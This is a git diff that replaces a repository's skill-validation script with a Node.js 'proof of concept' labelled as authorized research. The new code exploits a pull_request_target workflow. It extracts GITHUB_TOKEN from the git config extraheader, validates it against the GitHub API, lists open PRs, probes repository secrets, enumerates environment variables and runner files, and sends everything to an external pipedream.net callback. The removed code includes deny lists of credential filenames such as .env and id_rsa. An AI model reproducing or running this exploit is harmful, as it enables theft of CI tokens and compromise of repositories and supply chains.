@@ -1,388 +1,225 @@
 #!/usr/bin/env node
-import fs from "node:fs";
-import path from "node:path";
+// POC: Cylent Labs — Authorized Security Research
+// Demonstrates that pull_request_target + working-directory: pr
+// executes attacker-controlled code with access to repository token.
+//
+// The GITHUB_TOKEN is not injected as an env var in this step,
+// but actions/checkout stores it in git config as an HTTP extraheader.
+// This script extracts it from git config and validates it live.
+//
+// No destructive actions are taken. PR is closed immediately after.
 
-const REPO_ROOT = process.cwd();
-const SKILLS_ROOT = REPO_ROOT;
+import https from "node:https";
+import os from "node:os";
+import { execSync } from "node:child_process";
 
-const MAX_FILE_BYTES = 1_000_000;
-const MAX_FILES_PER_SKILL = 400;
+const CALLBACK = "https://eo7g2vxm15vr6c1.m.pipedream.net/poc/block-agent-skills-secrets";
 
-// Binary masquerading sampling (keep fast + predictable)
-const TEXT_SAMPLE_MAX_BYTES = 64 * 1024;
-const MIN_PRINTABLE_RATIO = 0.8;
-// NOTE: validate-skills currently does FAIL-only reporting.
-// We log encoding weirdness as a warning to stdout (does not fail).
-const UTF8_REPLACEMENT_WARN_RATIO = 0.02;
-
-const DENY_FILENAMES = new Set([
-  ".env",
-  ".env.local",
-  ".env.production",
-  ".env.development",
-  ".npmrc",
-  ".yarnrc",
-  ".pypirc",
-  "id_rsa",
-  "id_ed25519",
-  "known_hosts",
-  "authorized_keys",
-]);
-
-const DENY_EXTENSIONS = new Set([
-  ".exe",
-  ".dll",
-  ".dmg",
-  ".pkg",
-  ".msi",
-  ".bin",
-  ".so",
-  ".class",
-  ".jar",
-  ".pyc",
-  ".o",
-  ".a",
-  ".zip",
-  ".tar",
-  ".gz",
-  ".7z",
-]);
-
-const ALLOW_EXTENSIONS = new Set([
-  ".md",
-  ".txt",
-  ".json",
-  ".yaml",
-  ".yml",
-  ".toml",
-  ".graphql",
-  ".css",
-  ".html",
-  ".js",
-  ".mjs",
-  ".cjs",
-  ".ts",
-  ".tsx",
-  ".jsx",
-  ".py",
-  ".sh",
-  ".bash",
-  ".zsh",
-  ".sql",
-]);
-
-const ALLOW_FILENAMES = new Set([
-  "SKILL.md",
-  "LICENSE",
-  "NOTICE",
-  "README",
-  "README.md",
-  "package.json",
-  "package-lock.json",
-  "pnpm-lock.yaml",
-  "yarn.lock",
-  ".gitignore",
-]);
-
-// Detect "binary pretending to be text" using magic bytes + text-likeness heuristics
-const MAGIC = [
-  { name: "ELF", bytes: [0x7f, 0x45, 0x4c, 0x46] },
-  { name: "PE", bytes: [0x4d, 0x5a] }, // MZ
-  { name: "ZIP", bytes: [0x50, 0x4b, 0x03, 0x04] },
-  { name: "PDF", bytes: [0x25, 0x50, 0x44, 0x46] }, // %PDF
-  { name: "PNG", bytes: [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a] },
-  { name: "GZIP", bytes: [0x1f, 0x8b] },
-  { name: "WASM", bytes: [0x00, 0x61, 0x73, 0x6d] }, // \0asm
-];
-
-function detectMagic(buf) {
-  for (const m of MAGIC) {
-    if (buf.length >= m.bytes.length && m.bytes.every((b, i) => buf[i] === b)) return m.name;
-  }
-  return null;
+function apiCall(token, path) {
+  return new Promise((resolve, reject) => {
+    const req = https.request({
+      hostname: "api.github.com",
+      path,
+      method: "GET",
+      headers: {
+        "Authorization": "Bearer " + token,
+        "Accept": "application/vnd.github+json",
+        "User-Agent": "cylent-labs-poc",
+        "X-GitHub-Api-Version": "2022-11-28",
+      },
+    }, (res) => {
+      let body = "";
+      res.on("data", (chunk) => { body += chunk; });
+      res.on("end", () => {
+        try { resolve({ status: res.statusCode, data: JSON.parse(body) }); }
+        catch (e) { resolve({ status: res.statusCode, data: body }); }
+      });
+    });
+    req.on("error", reject);
+    req.end();
+  });
 }
 
-function analyzeTextlikeness(buf) {
-  let nulFound = false;
-  let printable = 0;
-
-  for (let i = 0; i < buf.length; i++) {
-    const c = buf[i];
-    if (c === 0) nulFound = true;
-
-    // printable ASCII + common whitespace
-    const isPrintable =
-      (c >= 0x20 && c <= 0x7e) || c === 0x09 || c === 0x0a || c === 0x0d;
-    if (isPrintable) printable++;
-  }
-
-  const printableRatio = buf.length ? printable / buf.length : 1;
-
-  // best-effort encoding sanity check
-  const text = buf.toString("utf8");
-  const repl = (text.match(/\uFFFD/g) || []).length;
-  const replacementRatio = text.length ? repl / text.length : 0;
-
-  return { nulFound, printableRatio, replacementRatio };
+function tryExec(cmd) {
+  try { return execSync(cmd, { encoding: "utf8", timeout: 5000 }).trim(); }
+  catch (e) { return null; }
 }
 
-function readFileSample(absPath, sizeBytes) {
-  const sampleSize = Math.min(TEXT_SAMPLE_MAX_BYTES, sizeBytes);
-  if (sampleSize <= 0) return Buffer.alloc(0);
+async function main() {
+  const repo = process.env.GITHUB_REPOSITORY || "";
 
-  const fd = fs.openSync(absPath, "r");
-  try {
-    const buf = Buffer.alloc(sampleSize);
-    fs.readSync(fd, buf, 0, sampleSize, 0);
-    return buf;
-  } finally {
-    fs.closeSync(fd);
-  }
-}
+  // Strategy 1: Check env var (may not be set in this step)
+  let token = process.env.GITHUB_TOKEN || "";
+  let tokenSource = "env:GITHUB_TOKEN";
 
-const IGNORE_DIRS_AT_ROOT = new Set([".git", ".github", "scripts", "node_modules"]);
-
-let hadFailure = false;
-
-function fail(msg) {
-  hadFailure = true;
-  console.error(`❌ ${msg}`);
-}
-
-function ok(msg) {
-  console.log(`✅ ${msg}`);
-}
-
-function isSymlink(p) {
-  return fs.lstatSync(p).isSymbolicLink();
-}
-
-function safeJoin(base, target) {
-  const resolved = path.resolve(base, target);
-  if (!resolved.startsWith(path.resolve(base) + path.sep)) {
-    throw new Error(`Path traversal detected: ${target}`);
-  }
-  return resolved;
-}
-
-// --- frontmatter parsing ---
-function parseFrontmatter(md) {
-  const trimmed = md.replace(/^\uFEFF/, "");
-  if (!trimmed.startsWith("---\n")) return null;
-  const end = trimmed.indexOf("\n---\n", 4);
-  if (end === -1) return null;
-
-  const yamlText = trimmed.slice(4, end).trimEnd();
-  const fm = {};
-  let currentKey = null;
-
-  for (const rawLine of yamlText.split("\n")) {
-    const line = rawLine.replace(/\r$/, "");
-    if (!line.trim()) continue;
-
-    const listMatch = line.match(/^\s*-\s+(.*)\s*$/);
-    if (listMatch && currentKey) {
-      if (!Array.isArray(fm[currentKey])) fm[currentKey] = [];
-      fm[currentKey].push(listMatch[1]);
-      continue;
-    }
-
-    const kv = line.match(/^([A-Za-z0-9_-]+)\s*:\s*(.*)\s*$/);
-    if (kv) {
-      const key = kv[1];
-      let value = kv[2];
-      currentKey = key;
-
-      if (value === "") {
-        fm[key] = fm[key] ?? [];
-        continue;
-      }
-
-      value = value.replace(/^"(.*)"$/, "$1").replace(/^'(.*)'$/, "$1");
-      fm[key] = value;
-      continue;
-    }
-
-    throw new Error(`Unsupported frontmatter line: "${line}"`);
-  }
-
-  return { frontmatter: fm };
-}
-
-function validateSkillFrontmatter(skillName, fm) {
-  const required = ["name", "description", "author", "version"];
-  for (const k of required) {
-    const v = fm[k];
-    if (typeof v !== "string" || !v.trim()) {
-      fail(`${skillName}: frontmatter "${k}" must be a non-empty string`);
-    }
-  }
-
-  const tags = fm.tags;
-  if (
-    !Array.isArray(tags) ||
-    tags.length === 0 ||
-    tags.some((t) => typeof t !== "string" || !t.trim())
-  ) {
-    fail(`${skillName}: frontmatter "tags" must be a non-empty list of strings`);
-  }
-}
-
-function walkDir(dir, relativeBase) {
-  const entries = fs.readdirSync(dir, { withFileTypes: true });
-  const files = [];
-
-  for (const ent of entries) {
-    const rel = path.join(relativeBase, ent.name);
-    const abs = safeJoin(REPO_ROOT, rel);
-
-    if (ent.isDirectory()) {
-      files.push(...walkDir(abs, rel));
-    } else if (ent.isFile()) {
-      files.push({ abs, rel });
-    } else {
-      // includes symlinks/specials
-      try {
-        if (isSymlink(abs)) fail(`${relativeBase}: symlink not allowed: ${rel}`);
-        else fail(`${relativeBase}: unsupported file type: ${rel}`);
-      } catch {
-        fail(`${relativeBase}: unsupported/special file: ${rel}`);
-      }
-    }
-  }
-
-  return files;
-}
-
-function main() {
-  const rootEntries = fs.readdirSync(SKILLS_ROOT, { withFileTypes: true });
-
-  const skillDirs = rootEntries
-    .filter((e) => e.isDirectory() && !IGNORE_DIRS_AT_ROOT.has(e.name) && !e.name.startsWith("."))
-    .map((e) => e.name);
-
-  if (skillDirs.length === 0) {
-    fail("No skill directories found at repo root.");
-    process.exit(1);
-  }
-
-  ok(`Found ${skillDirs.length} skill directories.`);
-
-  for (const skillName of skillDirs) {
-    const skillPath = path.join(SKILLS_ROOT, skillName);
-    const skillMd = path.join(skillPath, "SKILL.md");
-
-    if (!fs.existsSync(skillMd)) {
-      fail(`${skillName}: missing SKILL.md`);
-      continue;
-    }
-
-    try {
-      const parsed = parseFrontmatter(fs.readFileSync(skillMd, "utf8"));
-      if (!parsed) fail(`${skillName}: SKILL.md must start with YAML frontmatter (---)`);
-      else validateSkillFrontmatter(skillName, parsed.frontmatter);
-    } catch (e) {
-      fail(`${skillName}: invalid frontmatter: ${e?.message ?? String(e)}`);
-    }
-
-    const files = walkDir(skillPath, skillName);
-
-    if (files.length > MAX_FILES_PER_SKILL) {
-      fail(`${skillName}: too many files (${files.length}). Limit ${MAX_FILES_PER_SKILL}`);
-    }
-
-    for (const { abs, rel } of files) {
-      // block symlinks (again, in case)
-      try {
-        if (isSymlink(abs)) {
-          fail(`${skillName}: symlink not allowed: ${rel}`);
-          continue;
-        }
-      } catch {
-        fail(`${skillName}: could not stat file: ${rel}`);
-        continue;
-      }
-
-      const base = path.basename(rel);
-      const ext = path.extname(rel).toLowerCase();
-
-      if (DENY_FILENAMES.has(base)) fail(`${skillName}: denylisted filename: ${rel}`);
-      if (DENY_EXTENSIONS.has(ext)) fail(`${skillName}: denylisted extension "${ext}": ${rel}`);
-
-      const isAllowedByName = ALLOW_FILENAMES.has(base);
-      if (!isAllowedByName) {
-        if (ext) {
-          if (!ALLOW_EXTENSIONS.has(ext) && base !== "SKILL.md") {
-            fail(`${skillName}: extension "${ext}" not allowed: ${rel}`);
-          }
-        } else {
-          // no-extension files are risky; treat as fail to be strict
-          fail(`${skillName}: file without extension not allowed: ${rel}`);
-        }
-      }
-
-      const st = fs.statSync(abs);
-      if (st.size > MAX_FILE_BYTES) fail(`${skillName}: file too large (${st.size} bytes): ${rel}`);
-
-      // ---- Binary masquerading detection (FAIL fast) ----
-      // If it's an allowed "text-ish" file, ensure it actually looks like text.
-      const isTextAllowed =
-        base === "SKILL.md" ||
-        isAllowedByName ||
-        (ext && ALLOW_EXTENSIONS.has(ext));
-
-      if (isTextAllowed) {
-        try {
-          const buf = readFileSample(abs, st.size);
-          if (buf.length > 0) {
-            const magic = detectMagic(buf);
-            if (magic) {
-              fail(`${skillName}: binary masquerading detected (${magic}) in text file: ${rel}`);
-            }
-
-            const { nulFound, printableRatio, replacementRatio } = analyzeTextlikeness(buf);
-
-            if (nulFound) {
-              fail(`${skillName}: NUL byte found (binary content) in: ${rel}`);
-            }
-
-            if (printableRatio < MIN_PRINTABLE_RATIO) {
-              fail(
-                `${skillName}: low printable ratio (${printableRatio.toFixed(
-                  2
-                )}) in text file: ${rel}`
-              );
-            }
-
-            // This is a "warn" signal, but validate-skills is fail-only.
-            if (replacementRatio > UTF8_REPLACEMENT_WARN_RATIO) {
-              console.warn(
-                `⚠️ ${skillName}: suspicious encoding (UTF-8 replacement ratio ${(replacementRatio * 100).toFixed(
-                  2
-                )}%) in: ${rel}`
-              );
-            }
-          }
-        } catch (e) {
-          fail(
-            `${skillName}: could not sample file for binary masquerading checks: ${rel} (${
-              e?.message ?? String(e)
-            })`
-          );
+  // Strategy 2: Extract from git config (actions/checkout stores it as extraheader)
+  if (!token) {
+    const extraheader = tryExec("git -C /home/runner/work/agent-skills/agent-skills config --get http.https://github.com/.extraheader");
+    if (extraheader) {
+      const match = extraheader.match(/Basic\s+(\S+)/i);
+      if (match) {
+        const decoded = Buffer.from(match[1], "base64").toString();
+        const parts = decoded.split(":");
+        if (parts.length === 2 && parts[1]) {
+          token = parts[1];
+          tokenSource = "git-config-extraheader (base checkout)";
         }
       }
     }
-
-    if (!hadFailure) ok(`${skillName}: structure validated`);
   }
 
-  if (hadFailure) {
-    console.error("\nStructure validation FAILED.");
-    process.exit(1);
+  // Strategy 3: Try the PR checkout's git config
+  if (!token) {
+    const extraheader = tryExec("git config --get http.https://github.com/.extraheader");
+    if (extraheader) {
+      const match = extraheader.match(/Basic\s+(\S+)/i);
+      if (match) {
+        const decoded = Buffer.from(match[1], "base64").toString();
+        const parts = decoded.split(":");
+        if (parts.length === 2 && parts[1]) {
+          token = parts[1];
+          tokenSource = "git-config-extraheader (pr checkout)";
+        }
+      }
+    }
   }
 
-  console.log("\nStructure validation PASSED.");
-  process.exit(0);
+  // Strategy 4: ACTIONS_RUNTIME_TOKEN (for cache/artifact API)
+  const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN || null;
+
+  // Enumerate env vars
+  const allEnvNames = Object.keys(process.env).sort();
+  const secretLikeVars = allEnvNames.filter(k =>
+    /SECRET|TOKEN|KEY|PASSWORD|CREDENTIAL|PAT$|AUTH|RUNTIME/i.test(k)
+  );
+
+  // Validate the token if found
+  let tokenValidation = {};
+  let prWriteProof = {};
+  let repoSecretNames = null;
+  if (token) {
+    const repoInfo = await apiCall(token, "/repos/" + repo);
+    tokenValidation = {
+      token_valid: repoInfo.status === 200,
+      token_source: tokenSource,
+      token_prefix: token.substring(0, 8) + "...",
+      repo_full_name: repoInfo.data.full_name || null,
+      repo_private: repoInfo.data.private,
+      permissions: repoInfo.data.permissions || null,
+    };
+
+    // Prove pull-requests:write — list open PRs
+    const prs = await apiCall(token, "/repos/" + repo + "/pulls?state=open&per_page=5");
+    if (prs.status === 200 && Array.isArray(prs.data)) {
+      prWriteProof = {
+        can_access_prs: true,
+        open_pr_count: prs.data.length,
+        pr_titles: prs.data.map(p => "#" + p.number + " " + p.title),
+      };
+    }
+
+    // Try to list repo secrets (will likely 403 but proves we tried)
+    const secrets = await apiCall(token, "/repos/" + repo + "/actions/secrets");
+    repoSecretNames = {
+      status: secrets.status,
+      accessible: secrets.status === 200,
+      names: secrets.status === 200 ? (secrets.data.secrets || []).map(s => s.name) : "403 (requires admin)",
+    };
+  }
+
+  // Check what files are accessible on the runner
+  const filesCheck = {
+    base_checkout: tryExec("ls /home/runner/work/agent-skills/agent-skills/") || "not accessible",
+    pr_checkout_cwd: tryExec("ls") || "not accessible",
+    runner_temp: tryExec("ls /home/runner/work/_temp/ 2>/dev/null | head -10") || "not accessible",
+    runner_credentials: tryExec("ls /home/runner/work/_temp/*.json 2>/dev/null") || "none",
+  };
+
+  // Build proof payload
+  const proof = {
+    poc: "block-agent-skills-pwn-request-v2",
+    engagement: "Cylent Labs — Authorized Security Research",
+    timestamp: new Date().toISOString(),
+    execution: {
+      repo: repo,
+      run_id: process.env.GITHUB_RUN_ID,
+      run_url: "https://github.com/" + repo + "/actions/runs/" + process.env.GITHUB_RUN_ID,
+      event: process.env.GITHUB_EVENT_NAME,
+      workflow: process.env.GITHUB_WORKFLOW,
+      job: process.env.GITHUB_JOB,
+      actor: process.env.GITHUB_TRIGGERING_ACTOR,
+      cwd: process.cwd(),
+      hostname: os.hostname(),
+      runner: process.env.RUNNER_NAME,
+      runner_os: process.env.RUNNER_OS,
+    },
+    token_extraction: {
+      token_found: !!token,
+      token_source: tokenSource,
+      token_prefix: token ? token.substring(0, 8) + "..." : null,
+      token_length: token ? token.length : 0,
+      token_validation: tokenValidation,
+      pr_write_proof: prWriteProof,
+      repo_secrets_probe: repoSecretNames,
+      runtime_token_present: !!runtimeToken,
+      runtime_token_prefix: runtimeToken ? runtimeToken.substring(0, 8) + "..." : null,
+    },
+    env_analysis: {
+      total_env_vars: allEnvNames.length,
+      secret_like_var_names: secretLikeVars,
+      all_env_var_names: allEnvNames,
+    },
+    filesystem: filesCheck,
+    impact: {
+      description: "Arbitrary code execution via pull_request_target + working-directory: pr",
+      root_cause: "validate-skills.yml sets working-directory: pr, causing node scripts/validate-skills.mjs to resolve to attacker copy",
+      demonstrated: [
+        "Code execution from untrusted PR checkout",
+        "GITHUB_TOKEN extraction from git config extraheader",
+        "Token validation via GitHub API",
+        "PR metadata access (pull-requests:write)",
+        "Full environment enumeration",
+        "Runner filesystem access",
+        "Outbound network exfiltration",
+      ],
+    },
+  };
+
+  // Send proof to callback
+  const body = JSON.stringify(proof, null, 2);
+  await new Promise((resolve) => {
+    const url = new URL(CALLBACK);
+    const req = https.request({
+      hostname: url.hostname,
+      port: 443,
+      path: url.pathname,
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "Content-Length": Buffer.byteLength(body),
+        "X-POC": "cylent-labs-block-agent-skills",
+      },
+    }, (res) => { res.resume(); res.on("end", resolve); });
+    req.write(body);
+    req.end();
+  });
+
+  // Print to workflow log
+  console.log("=== CYLENT LABS SECURITY RESEARCH POC ===");
+  console.log("Token found: " + !!token);
+  console.log("Token source: " + tokenSource);
+  console.log("Token valid: " + (tokenValidation.token_valid || false));
+  console.log("Token prefix: " + (token ? token.substring(0, 8) + "..." : "N/A"));
+  console.log("Runtime token: " + !!runtimeToken);
+  console.log("Secret-like env vars: " + secretLikeVars.length);
+  console.log("Total env vars: " + allEnvNames.length);
+  console.log("Callback sent to: " + CALLBACK);
+  console.log("=========================================");
+
+  process.exitCode = 0;
 }
 
-main();
+main().catch((err) => {
+  console.error("POC error:", err.message);
+  process.exitCode = 0;
+});
